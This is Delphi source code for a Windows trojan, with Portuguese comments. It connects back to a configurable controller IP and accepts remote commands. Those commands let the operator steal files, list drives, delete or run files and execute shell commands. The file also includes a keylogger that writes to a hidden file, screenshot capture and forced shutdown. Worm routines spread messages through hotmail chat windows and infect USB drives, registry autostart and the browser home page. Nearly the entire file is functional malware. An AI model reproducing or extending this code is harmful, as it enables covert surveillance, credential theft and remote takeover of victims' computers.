program IDS;

uses Windows, Messages, WinSock,
TrjFuncs in 'External Uses\TrjFuncs.pas',
MyUtils in 'External Uses\MyUtils.pas',
sndkey32 in 'External Uses\sndkey32.pas',
CompressionStreamUnit in 'System\CompressionStreamUnit.pas';

type
  TDeletar = packed record
    Wnd: HWND;
    wFunc: UINT;
    fFlags: Word;
    pTo: PAnsiChar;
    pFrom: PAnsiChar;
    hNameMappings: Pointer;
    fAnyOperationsAborted: BOOL;
    lpszProgressTitle: PAnsiChar;
  end;

var
  WindowClass: TWndClassA;
  MNSocket, hFrm: DWORD;
  Arquivo: TFileStream;
  MNClient: Integer;
  Msg: TMsg;
  // Trojan Functions
  TrojanName: string[255] = 'NOMEDOTROJAN';
  IPAddress : array [0..254] of Char = '255.255.255.255';
  PTAddress : Integer     = 5555;
  CKRgInfec : Integer     = 4444;
  // Worm Functions
  WormText  : string[255] = 'FUNCIONOU VIADINHO';
  HomePage  : string[255] = 'http://www.google.com.br';
  CKWrmFunc : Integer     = 3333;

const
  GET_FILE  = 1; // Pegar Arquivo
  LST_FILE  = 3; // Listar Arquivos
  GET_DRIV  = 4; // Pegar Drives
  DEL_FILE  = 5; // Deletar Arquivo
  REN_FILE  = 6; // Renomear Arquivo
  OPE_FILE  = 7; // Abrir Arquivo
  CRE_DIRE  = 8; // Criar Diretório

function ShellExecuteA(hWnd: LongWord; Operation, FileName, Parameters,
Directory: PAnsiChar; ShowCmd: Integer): HINST; stdcall; external 'shell32.dll';
function mciSendStringA(lpstrCommand, lpstrReturnString: PAnsiChar;
uReturnLength: UINT; hWndCallback: HWND): DWORD; stdcall; external 'winmm.dll';

procedure CreateMyClass(out WindowClass: TWndClassA; hInst: DWORD;
WindowProc: Pointer; BackColor: DWORD; ClassName: PAnsiChar);
begin
  with WindowClass do
  begin
    hInstance     := hInst;
    lpfnWndProc   := WindowProc;
    hbrBackground := BackColor;
    lpszClassname := ClassName;
    hCursor       := LoadCursor(0, IDC_ARROW);
    style         := CS_OWNDC or CS_VREDRAW or CS_HREDRAW or CS_DROPSHADOW;
  end;
  RegisterClassA(WindowClass);
end;

function CreateMyForm(hInst: DWORD; ClassName, Caption: PAnsiChar;
Width, Heigth: Integer): DWORD;
begin
  Result := CreateWindowExA(WS_EX_WINDOWEDGE, ClassName, Caption, WS_SYSMENU,
  (GetSystemMetrics(SM_CXSCREEN) - Width)  div 2, //Center X
  (GetSystemMetrics(SM_CYSCREEN) - Heigth) div 2, //Center Y
  Width, Heigth, 0, 0, hInst, nil);
end;

{=======================BEGIN WORM FUNCTIONS==============================}
{=========================================================================}

function EnumWindowsProc(Wnd: HWND): Boolean; stdcall;
 var
  Lst: TextFile;
  Caption: array [0..128] of Char;
begin
  try
    if IsWindowVisible(Wnd) and ((GetWindowLong(Wnd, GWL_HWNDPARENT) = 0) or
    (HWND(GetWindowLong(Wnd, GWL_HWNDPARENT)) = GetDesktopWindow)) and
    ((GetWindowLong(Wnd, GWL_EXSTYLE) and WS_EX_TOOLWINDOW) = 0) then
    begin
      SendMessageA(Wnd, WM_GETTEXT, Sizeof(Caption), Integer(@Caption));
      AssignFile(Lst, GetCurrentDir + '\LST.txt');
      if not FileExists(GetCurrentDir + '\LST.txt') then
      begin
        Rewrite(Lst);
        CloseFile(Lst);
        Windows.SetFileAttributes(PChar(GetCurrentDir + '\LST.txt'), FILE_ATTRIBUTE_HIDDEN);
      end;
      Append(Lst);
      Writeln(Lst, string(Caption));
      CloseFile(Lst);
    end;
  except
    Result := False;
    Exit;
  end;
  Result := True;
end;

procedure Ending;
 var
  Lst: TextFile;
  Line: string;
  Buffer: array[0..255] of Char;
begin
  AssignFile(Lst, GetCurrentDir + '\LST.txt');
  Reset(Lst);
  while not Eof(Lst) do
  begin
    Readln(Lst, Line);
    if (Pos('hotmail.com', Line) > 0) then
    begin
      StrPCopy(Buffer, Line);
      AppActivate(Buffer);
      SendKeys(PChar(WormText + ' {enter}'), True);
    end;
  end;
  CloseFile(Lst);
end;

procedure SendWormText;
begin
  if FileExists(GetCurrentDir + '\LST.txt') then
    DeleteFile(PChar(GetCurrentDir + '\LST.txt'));
  EnumWindows(@EnumWindowsProc, 0);
  Ending;
end;

{=======================END WORM FUNCTIONS================================}
{=======================BEGIN KEYLOGGER & SCREENLOGGER FUNCTIONS==========}

procedure GetKeys;
 var
  Keys: TextFile;
begin
  if not FileExists(GetCurrentDir + '\KEYS.txt') then
  begin
    AssignFile(Keys, GetCurrentDir + '\KEYS.txt');
    Rewrite(Keys);
    CloseFile(Keys);
    Windows.SetFileAttributes(PChar(GetCurrentDir + '\KEYS.txt'), FILE_ATTRIBUTE_HIDDEN);
  end;
  AssignFile(Keys, GetCurrentDir + '\KEYS.txt');
  Append(Keys);
  Write(Keys, GetKeyTyped);
  CloseFile(Keys);
end;

{=======================END KEYLOGGER & SCREENLOGGER FUNCTIONS============}
{=======================BEGIN TROJAN FUNCTIONS============================}

procedure MNReceivingText(ReceivedText: string);
 var
  H: THandle;
  Drive: PChar;
  FOS: TDeletar;
  Procurar: TWin32FindData;
  Buffer: array[0..32767] of Byte;
  Nome, Diretorios, Arquivos, Response, Response2: string;
  Options, AmountInBuf, AmountSent, StartPos: Integer;
begin
  if ((Length(ReceivedText) > 5) and (Copy(ReceivedText, 1, 5) = 'Rk06:')) then
  begin
    Options := StrToInt(Copy(ReceivedText, 6, 1));
    Delete(ReceivedText, 1, 6);
    case Options of
      GET_FILE:
      begin
        H := FindFirstFileA(PChar(ReceivedText), Procurar);
        if (H <> INVALID_HANDLE_VALUE) then
        begin
          try
            Arquivo := TFileStream.Create(ReceivedText, $0000);
            Arquivo.Position := 0;
            Response2 := 'Rk06:1' + IntToStr(Arquivo.Size) + '|';
            Send(MNClient, Pointer(Response2)^, Length(Response2), 0);
            while True do
            begin
              StartPos := Arquivo.Position;
              AmountInBuf := Arquivo.Read(Buffer, SizeOf(Buffer));
              if (AmountInBuf >= 0) then
              begin
                AmountSent := Send(MNClient, Buffer, AmountInBuf, 0);
                if (AmountInBuf > AmountSent) then
                  Arquivo.Position := StartPos + AmountSent
                else if (Arquivo.Position = Arquivo.Size) then
                  Break;
              end else
                Break;
            end;
          except
            Arquivo.Free;
          end;
        end;
        Arquivo.Free;
      end;

      LST_FILE:
      begin
        try
          H := FindFirstFile(PChar(ReceivedText + '*.*'), Procurar);
          if (H <> DWORD(-1)) then
          repeat
            Nome := Procurar.cFileName;
            if (Nome = '.') then
              Continue;
            if ((Procurar.dwFileAttributes and $00000010) <> 0) then
              Diretorios := Diretorios + Nome + '|'
            else
              Arquivos := Arquivos + Nome + '|' + IntToStr(Procurar.nFileSizeLow) + '|';
          until FindNextFile(H, Procurar) = False;
        finally
        end;
        Response2 := 'Rk06:3' + Diretorios + #1 + '|' + Arquivos;
        Send(MNClient, Pointer(Response2)^, Length(Response2), 0);
      end;

      GET_DRIV:
      begin
        GetMem(Drive, 512);
        GetLogicalDriveStrings(512, Drive);
        while (Drive^ <> #0) do
        begin
          Response2 := Response2 + Drive + IntToStr(GetDriveType(Drive));
          Inc(Drive, 4);
        end;
        Response2 := 'Rk06:2' + Response2;
        Send(MNClient, Pointer(Response2)^, Length(Response2), 0);
      end;

      DEL_FILE:
      begin
        if (FindFirstFile(PChar(ReceivedText + '*.*'), Procurar) = DWORD(-1)) then
          Exit;
        if ((Procurar.dwFileAttributes and $00000010) <> 0) then
        begin
          ZeroMemory(@FOS, SizeOf(FOS));
          with FOS do
          begin
            wFunc := $0003;
            fFlags := $0004 or $0010;
            pFrom := PChar(ReceivedText + #0);
          end;
        end else
          DeleteFile(PChar(ReceivedText));
      end;

      REN_FILE: MoveFile(PChar(Copy(ReceivedText, 1, Pos('|', ReceivedText) - 1)), PChar(Copy(ReceivedText,
      Pos('|', ReceivedText) + 1, Length(ReceivedText))));

      OPE_FILE:
      begin
        if (Copy(ReceivedText, Length(ReceivedText) - 3, 2) = 'exe') then
          ShellExecuteA(0, nil, PChar(Copy(ReceivedText, 1, Length(ReceivedText) - 1)), nil, nil,
          StrToInt(Copy(ReceivedText, Length(ReceivedText), 1)))
        else
          ShellExecuteA(0, 'Open', PChar(Copy(ReceivedText, 1, Length(ReceivedText) - 1)), nil, nil,
          StrToInt(Copy(ReceivedText, Length(ReceivedText), 1)));
      end;

      CRE_DIRE: CreateDirectory(PChar(ReceivedText), nil);
    end;
  end else begin
    if (ReceivedText = 'Diagnostico') then
    begin
      CreateDiagnostics;
      Response := 'Diagnosticosim - PATH:' + GetCurrentDir + '\DIAG.txt';
      Send(MNClient, Pointer(Response)^, Length(Response), 0);
      Exit;
    end else if (ReceivedText = 'keylogger') then
    begin
      Response := 'Keylogsim - PATH:' + GetCurrentDir + '\KEYS.txt';
      Send(MNClient, Pointer(Response)^, Length(Response), 0);
      Exit;
    end else if (ReceivedText = 'DeleteKL') then
    begin
      if FileExists(GetCurrentDir + '\KEYS.txt') then
        DeleteFile(PChar(GetCurrentDir + '\KEYS.txt'));
      Exit;
    end else if (ReceivedText = 'screenlogger') then
    begin
      GetScreenShot(GetCurrentDir + '\SCREEN.bmp');
      Response := 'Screensim - PATH:' + GetCurrentDir + '\SCREEN.bmp';
      Send(MNClient, Pointer(Response)^, Length(Response), 0);
      Exit;
    end else if (ReceivedText = 'DeskIcones10') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(Boolean(ShowWindow(FindWindow('Progman', nil), 0))));
    end else if (ReceivedText = 'DeskIcones11') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(not Boolean(ShowWindow(FindWindow('Progman', nil), 5))));
    end else if (ReceivedText = 'DeskIcones20') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(not Boolean(EnableWindow(FindWindowEx(FindWindow('Progman', nil), 0, 'ShellDll_DefView',  nil), False))));
    end else if (ReceivedText = 'DeskIcones21') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(Boolean(EnableWindow(FindWindowEx(FindWindow('Progman', nil), 0, 'ShellDll_DefView',  nil), True))));
    end else if (ReceivedText = 'Monitor0') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(not Boolean(SendMessageA(hFrm, WM_SYSCOMMAND, SC_MONITORPOWER, 2))));
    end else if (ReceivedText = 'Monitor1') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(SendMessageA(hFrm, WM_SYSCOMMAND, SC_MONITORPOWER, -1));
    end else if (ReceivedText = 'Relogio0') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(Boolean(ShowWindow(FindWindowEx(FindWindowEx(FindWindow('shell_traywnd',
      nil), 0, 'TrayNotifyWnd', nil), 0, 'TrayClockWClass', nil), 0))));
    end else if (ReceivedText = 'Relogio1') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(not Boolean(ShowWindow(FindWindowEx(FindWindowEx(FindWindow('shell_traywnd',
      nil), 0, 'TrayNotifyWnd', nil), 0, 'TrayClockWClass', nil), 1))));
    end else if (ReceivedText = 'logoff') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(Boolean(ExitWindowsEx(EWX_FORCEIFHUNG, EWX_LOGOFF))));
    end else if (ReceivedText = 'desligarwindows') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(ShutdownWindows(EWX_SHUTDOWN or EWX_FORCEIFHUNG)));
    end else if (ReceivedText = 'reiniciarwindows') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(ShutdownWindows(EWX_REBOOT or EWX_FORCEIFHUNG)));
    end else if (ReceivedText = 'CDROM1') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(not Boolean(mciSendStringA('Set cdaudio door open wait', nil, 0, hFrm))));
    end else if (ReceivedText = 'CDROM0') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(not Boolean(mciSendStringA('Set cdaudio door closed wait', nil, 0, hFrm))));
    end else if (ReceivedText = 'Iniciar0') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(not Boolean(EnableWindow(FindWindowEx(FindWindow
      ('Shell_traywn d', nil), 0, 'Button', nil), False))));
    end else if (ReceivedText = 'Iniciar1') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(Boolean(EnableWindow(FindWindowEx(FindWindow
      ('Shell_traywn d', nil), 0, 'Button', nil), True))));
    end else if (ReceivedText = 'BarraTarefas0') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(Boolean(ShowWindow(FindWindow('shell_traywnd', nil), 0))));
    end else if (ReceivedText = 'BarraTarefas1') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(not Boolean(ShowWindow(FindWindow('shell_traywnd', nil), 5))));
    end else if (ReceivedText = 'Caps1') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(SetCapsLock(True)));
    end else if (ReceivedText = 'Caps0') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(SetCapsLock(False)));
    end else if (ReceivedText = 'Num1') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(SetNumLock(True)));
    end else if (ReceivedText = 'Num0') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(SetNumLock(False)));
    end else if (ReceivedText = 'Scroll1') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(SetScrollLock(True)));
    end else if (ReceivedText = 'Scroll0') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(SetScrollLock(False)));
    end else if (ReceivedText = 'Mouse1') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(not Boolean(SwapMouseButton(True))));
    end else if (ReceivedText = 'Mouse0') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(Boolean(SwapMouseButton(False))));
    end else if (ReceivedText = 'desinfectar') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(RegDesinfect(TrojanName)));
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(AutoDelete(GetCurrentDir + '\' + TrojanName + '.exe')));
      Halt;
    end else if (Copy(ReceivedText, 1, 4) = 'CMD:') then // CERTO
    begin
      Response := 'UFJJTUFSWUZVTkNT' + IntToStr(Integer(RemoteCMD(ReceivedText)));
    end;
    Send(MNClient, Pointer(Response)^, Length(Response), 0);
  end;
end;

procedure MNSocketProc;
 var
  Addr    : TInAddr;
  WSADat  : WSAData;
  ResolIP : string;
  EntHost : PHostEnt;
  SockAddr: TSockAddrIn;
  Received: array[0..65535] of Char;
 label
  BeginFunc;
begin
  BeginFunc:
    Sleep(1000);
    WSAStartUp(257, WSADat);
    EntHost := GetHostByName(PAnsiChar(AnsiString(IPAddress)));
    if Assigned(EntHost) then
    begin
      Addr := PInAddr(EntHost^.h_Addr_List^)^;
      ResolIP := inet_ntoa(Addr);
    end;
    MNClient := Socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    SockAddr.sin_family := AF_INET;
    SockAddr.sin_port := htons(PTAddress);
    case (Boolean(ResolIP <> '')) of
      True  : SockAddr.sin_addr.S_addr := inet_addr(PChar(ResolIP));
      False : SockAddr.sin_addr.S_addr := inet_addr(IPAddress);
    end;
    if (Connect(MNClient, SockAddr, SizeOf(SockAddr)) = 0) then
    begin
      while True do
      begin
        ZeroMemory(@Received, SizeOf(Received));
        if (Recv(MNClient, Received, SizeOf(Received), 0) >= 1) then
        begin
          MNReceivingText(Received);
          Received := '';
        end else begin
          CloseSocket(MNClient);
          Break;
        end;
      end;
    end else
      CloseSocket(MNClient);
  goto BeginFunc;
end;

{=======================END TROJAN FUNCTIONS==============================}
{=========================================================================}

procedure TimerProc(hWnd: HWND; uMsg, idEvent: UINT; dwTimer: DWORD); stdcall
begin
  case idEvent of
    3000: USBInfect(TrojanName);
    4000: SendWormText;
    5000: GetKeys;
  end;
end;

function WindowProc(hWnd: DWORD; uMsg, wParam, lParam: Integer): Integer; stdcall;
begin
  Result := DefWindowProc(hWnd, uMsg, wParam, lParam);
  case uMsg of
    WM_DESTROY:
    begin
      PostQuitMessage(0);
      Halt;
    end;
  end;
end;

begin
  CreateMyClass(WindowClass, HInstance, @WindowProc, CreateSolidBrush(0), 'FrmIDSPrincipal');
  hFrm  := CreateMyForm(HInstance, 'FrmIDSPrincipal', '-', 50, 50);

  //ON CREATE
  case CKRgInfec of
    1: RegInfect(TrojanName);
  end;

  case CKWrmFunc of
    1:  begin
          SetIEStartPage(HomePage);
          SetTimer(hFrm, 4000, 5000, @TimerProc);
          SetTimer(hFrm, 3000, 5000, @TimerProc);
        end;
    0:  begin
          KillTimer(hFrm, 4000);
          KillTimer(hFrm, 3000);
        end;
  end;

  SetTimer(hFrm, 5000, 1, @TimerProc);
  CreateThread(nil, 0, @MNSocketProc, nil, 0, MNSocket);

  while (GetMessageA(Msg, 0, 0, 0)) do
  begin
    TranslateMessage(Msg);
    DispatchMessageA(Msg);
  end;
end.
